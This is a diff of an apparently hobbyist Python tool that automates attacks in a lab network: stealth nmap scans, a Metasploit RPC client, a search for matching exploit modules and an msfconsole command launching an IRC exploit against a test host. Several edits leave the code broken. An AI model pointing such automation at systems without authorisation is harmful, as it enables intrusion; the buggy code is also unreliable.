@@ -15,7 +15,7 @@
 #
 #----------------------------------------------------
 import subprocess, os, sys, json, random, time
-import msfpack, http.client
+import msgpack, http.client
 
 #global variables to be later changed to user input
 hosts = ['192.168.56.3']
@@ -24,8 +24,8 @@ iface = 'vboxnet0'
 
 #global variables for debugging
 #some things don't need to be run every time for testing:
-nmap_debug = 1
-search_debug = 1
+nmap_debug = 0
+search_debug = 0
 post_debug = 1
 
 #msf needs its own special directory
@@ -41,6 +41,7 @@ class Host:
         self.scanxml = hostname + '.xml'
         self.exploits_file = hostname + '.json'
         self.exploits = []
+        self.host.session = None
 
 #pythons msfrpc is garbage and pymsfrpc wont import --_(*_*)_--
 class Msfrpc:
@@ -49,8 +50,18 @@ class Msfrpc:
         self.host = "127.0.0.1"
         self.port = 55552
         self.token = False
-        else:
-            self.client = http.client.HTTPConnection(self.host,self.port)
+        self.client = http.client.HTTPConnection(self.host,self.port)
+
+    def msf_decode(bytes_dict):
+    #wanted to do this but an attriberror makes it not reliable
+    #return {str(a).decode('utf-8'):str(b).decode('utf-8') for a,b in bytes_dict.items()}
+        out = {}
+        for attrib,value in bytes_dict.items():
+            if type(value) is bool:
+                out.update({attrib.decode('utf-8'):value})
+            else:
+                out.update({attrib.decode('utf-8'):value.decode('utf-8')})
+        return out
 
     def encode(self,data):
         return msgpack.packb(data)
@@ -66,7 +77,7 @@ class Msfrpc:
         params = self.encode(opts)
         self.client.request("POST","/api/",params,{"Content-type" : "binary/message-pack" })
         resp = self.client.getresponse()
-        return self.decode(resp.read()) 
+        return msf_decode(self.decode(resp.read())) 
 
 #has a flexible network scanner and parses data
 #to format which is useful for metasploit
@@ -74,8 +85,7 @@ class NetworkScanner:
 
     def __init__(self):
         self.nmap_command = None
-        self.options_list = 
-        {
+        self.options_list = {
             None: '-F',
             'Quiet' : '-sS -T3 -f',
             'Normal' : '-sV -T4 --script=banner',
@@ -159,7 +169,7 @@ class DatabaseFind:
                     exploit = file.readlines()
                 exploits.append(exploit[1].split()[2].split('.')[0])
                 subprocess.call(['rm', exp_num + '.rb'])
-        #override the old exploit data
+        #override the old exploit data 
         host.exploits = exploits
 
 class Exploit:
@@ -170,18 +180,24 @@ class Exploit:
         self.msf_usr = 'msf'
         self.msf_pass = ''
         chars = 'abcdefghijklmnopqrytuvwxyzABCDEFGHIJKLMNOPQRYTUVWXYZ1234567890'
-        password_length = 30
+        password_length = 8
         r = random.SystemRandom()
         self.msf_pass = ''.join([r.choice(chars) for i in range(password_length)])
-        #start msfrpc
-        subprocess.call(("msfconsole -x 'load msgrpc Pass=" + self.msf_pass + "'").split())
+        #start msfrpc, unfortunately msfrpcd is not working properly.
+        # msfrpcd_init_cmd = ["msfconsole","-x","'load msgrpc Pass=" + self.msf_pass + "'","&"]
+        '''possible solution from trustwave:
+         To automate both database connections and starting the msfrpc server inside 
+         Metasploit we can create a rc file, 
+         a file full of commands that we want Metasploit to run automatically. 
+         Let's create our file and name it setup.rc:
+        '''
+        msfrpcd_init_cmd = ["msfconsole","-x","'load msgrpc'"]
+        subprocess.Popen(msfrpcd_init_cmd,shell=True,stdout=subprocess.PIPE)
         #login
         self.client = Msfrpc({})
-        self.token = msf_decode(self.client.call('auth.login',['msf',self.msf_pass]))['token']
-        client.authenticated = True
+        self.token = self.client.call('auth.login',['msf',self.msf_pass])
         #create console
-        self.console_id = msf_decode(self.client.call('console.create'))
-        print('[+]Exploit framework initialized.')
+        self.console_id = self.client.call('console.create')
 
     def exploit(self, host):
         #search for equivalent exploit
@@ -197,17 +213,16 @@ class Exploit:
         #keep session in background
         msf_cmd = 'msfconsole -x "use exploit/unix/irc/'+host.exploits[0]+\
         ';set RHOST 10.10.10.2; exploit;"'
-        print('[*]'+msf_cmd)
         #output = subprocess.Popen(msf_cmd.split())
         #print(output)
 
 class PostExploitation:
 
     def __init__(self):
-        print('[+]Created')
+        pass
 
     def load_files(self):
-        print('[+]Loaded')
+        pass
 
 class HostController:
 
@@ -226,17 +241,6 @@ class HostController:
         print('[+]The following services were found:')
         if(not post_debug):
             subprocess.Popen(['rm','-rf',msf_exploit_dir])
-
-def msf_decode(bytes_dict):
-    #wanted to do this but an attriberror makes it not reliable
-    #return {str(a).decode('utf-8'):str(b).decode('utf-8') for a,b in bytes_dict.items()}
-    out = {}
-    for attrib,value in bytes_dict.items():
-        if type(value) is bool:
-            out.update({attrib.decode('utf-8'):value})
-        else:
-            out.update({attrib.decode('utf-8'):value.decode('utf-8')})
-    return out
 
 def console():
     #make sure user is root
@@ -259,4 +263,3 @@ if __name__ == '__main__':
     for ip in hosts:
         host = Host(ip, 'vulnerable')
         controller.exploit_target(host, options)
-
